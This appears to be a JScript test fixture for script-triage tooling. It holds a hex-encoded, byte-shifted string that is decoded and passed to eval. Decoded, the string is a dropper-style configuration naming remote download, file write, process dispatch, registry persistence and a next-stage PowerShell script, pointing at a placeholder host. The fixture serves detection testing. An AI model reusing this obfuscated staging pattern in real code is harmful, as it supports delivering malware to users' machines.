// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_80dc984a(v_a19c) {
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push((v_a19c[i] - 4 + 256) % 256); }
  return v_b27e;
}
function recover_975f73da() {
  // configuration reconstruction
  var packedText = "7f:26:77:78:69:74:77:26:3e:5f:26:65:67:75:79:6d:76:69:63:76:69:71:73:78:69:26:30:26:7b:76:6d:78:69:63:6a:6d:70:69:26:30:26:68:6d:77:74:65:78:67:6c:63:74:76:73:67:69:77:77:26:30:26:6c:65:72:68:73:6a:6a:63:77:67:76:6d:74:78:26:61:30:26:65:68:65:74:78:69:76:26:3e:26:51:6d:67:76:73:77:73:6a:78:32:5c:51:50:4c:58:58:54:26:30:26:7a:65:70:79:69:77:26:3e:7f:26:67:65:71:74:65:6d:6b:72:63:6d:68:26:3e:26:67:65:71:74:65:6d:6b:72:31:38:39:69:3a:3c:3d:3d:3b:69:6a:26:30:26:79:76:70:26:3e:26:6c:78:78:74:77:3e:33:33:38:39:69:3a:3c:3d:3d:3b:69:6a:32:69:7c:65:71:74:70:69:32:6d:72:7a:65:70:6d:68:33:6a:69:66:38:3b:3c:68:69:32:68:65:78:26:30:26:79:77:69:76:63:65:6b:69:72:78:26:3e:26:4c:79:72:78:76:69:77:77:50:65:66:33:38:39:69:3a:3c:3d:3d:3b:69:6a:26:30:26:6a:6d:70:69:63:74:65:78:6c:26:3e:26:47:3e:60:60:59:77:69:76:77:60:60:54:79:66:70:6d:67:60:60:4c:79:72:78:76:69:77:77:50:65:66:60:60:77:78:65:6b:69:31:38:39:69:3a:3c:3d:3d:3b:69:6a:32:68:65:78:26:30:26:76:69:6b:6d:77:78:76:7d:63:74:65:78:6c:26:3e:26:4c:4f:47:59:60:60:57:73:6a:78:7b:65:76:69:60:60:4c:79:72:78:76:69:77:77:50:65:66:60:60:48:6d:77:74:73:77:65:66:70:69:60:60:38:39:69:3a:3c:3d:3d:3b:69:6a:26:30:26:72:69:7c:78:63:77:78:65:6b:69:26:3e:26:76:69:77:73:79:76:67:69:31:77:65:71:74:70:69:32:74:77:35:26:81:30:26:77:78:65:6b:69:47:73:79:72:78:26:3e:38:81";
  var packedParts = packedText.split(":");
  var v_a19c = [];
  for (var hi = 0; hi < packedParts.length; hi++) { v_a19c.push(parseInt(packedParts[hi], 16)); }
  var v_f602 = (19 * 7) - 133;
  var v_b27e = decode_80dc984a.apply(null, [v_a19c]);
  var textParts = [], bi = 0;
  for (bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
  // end reconstruction
}
function inspect_f85d2243() {
  var v_d41a = eval("(" + recover_975f73da.apply(null, []) + ")");
  var table = { steps: function() { return v_d41a.steps; }, values: function() { return v_d41a.values; } };
  return { steps: table.steps.apply(null, []), adapter: v_d41a["adapter"], values: table["values"].apply(null, []), stageCount: v_d41a["stageCount"] };
}
